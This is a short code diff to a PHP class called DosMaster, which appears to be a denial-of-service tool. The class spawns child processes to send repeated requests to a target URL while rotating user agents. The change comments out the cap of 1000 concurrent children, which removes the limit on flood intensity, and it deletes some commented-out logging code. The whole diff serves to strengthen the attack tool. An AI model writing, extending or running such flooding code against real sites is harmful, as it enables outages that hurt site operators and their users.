@@ -60,23 +60,12 @@ class DosMaster
     {
         if ($this->secondsCnt) {
             $this->childrenCnt = floor($this->requestsCnt / $this->secondsCnt);
-            if ($this->childrenCnt > 1000) $this->childrenCnt = 1000; 
+            // if ($this->childrenCnt > 1000) $this->childrenCnt = 1000; 
         }
 
         $url = base64_encode($this->url);
 
         $acnt = count($this->agents);
-
-        // $cmd = 'echo ' . json_encode([
-        //     "url"           => $this->url,
-        //     "requestsCnt"   => $this->requestsCnt,
-        //     "childrenCnt"   => $this->childrenCnt,
-        //     "secondsCnt"    => $this->secondsCnt,
-        // ], 256) . '\n';
-
-        // `$cmd >> {$this->logFolder}/{$this->logFileName}`;
-
-
 
         while ($this->reqCnt > 0) {
             for ($c = 0; $c < $this->childrenCnt; $c++) {
